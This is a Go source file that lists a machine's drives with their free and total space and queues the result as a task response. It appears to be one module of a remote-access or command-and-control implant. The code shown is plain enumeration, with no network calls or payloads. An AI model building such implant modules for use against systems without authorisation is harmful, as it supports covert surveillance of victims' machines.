package drives

import (
	"encoding/json"

	"pkg/profiles"
	"pkg/utils/structs"
	"sync"
)

var mu sync.Mutex

type Drive struct {
	Name             string `json:"name"`
	Description      string `json:"description"`
	FreeBytes        uint64 `json:"free_bytes"`
	TotalBytes       uint64 `json:"total_bytes"`
	FreeBytesPretty  string `json:"free_bytes_pretty"`
	TotalBytesPretty string `json:"total_bytes_pretty"`
}

//Run - Function that executes the shell command
func Run(task structs.Task) {
	msg := structs.Response{}
	msg.TaskID = task.TaskID

	res, err := listDrives()

	if err != nil {
		msg.UserOutput = err.Error()
		msg.Completed = true
		msg.Status = "error"

		resp, _ := json.Marshal(msg)
		mu.Lock()
		profiles.TaskResponses = append(profiles.TaskResponses, resp)
		mu.Unlock()
		return
	}

	driveJson, err := json.MarshalIndent(res, "", "    ")
	msg.UserOutput = string(driveJson)
	msg.Completed = true
	resp, _ := json.Marshal(msg)
	mu.Lock()
	profiles.TaskResponses = append(profiles.TaskResponses, resp)
	mu.Unlock()
	return
}
